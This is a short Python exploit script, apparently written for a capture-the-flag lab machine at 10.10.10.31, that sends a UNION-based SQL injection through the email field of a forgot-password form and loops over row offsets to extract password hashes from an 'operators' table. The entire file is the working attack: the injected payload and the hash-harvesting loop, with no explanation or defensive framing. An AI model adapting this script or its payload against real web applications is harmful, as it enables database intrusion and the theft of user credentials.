#!/usr/bin/env python3

from urllib import request
import re

url = "http://10.10.10.31/cmsdata/forgot.php"
headers = {"Content-Type":"application/x-www-form-urlencoded"}

for i in range(1,1000):
    data = f"email=test@a.c' uNiOn select 1,2,3,group_concat((select __password_ from operators LIMIT 1 OFFSET {i}),'@a.c') LIMIT 1-- -".encode()
    req = request.Request(url, data=data, headers=headers)
    resp = request.urlopen(req)
    body = resp.read().decode()
    asd = re.findall("<h2>.*", body)
    password = re.findall(r"\w{32}",''.join(asd))
    if ''.join(password) != '5f4dcc3b5aa765d61d8327deb882cf99':
        print(f"Got alternative hash!: {password} - offset {i}")
        break
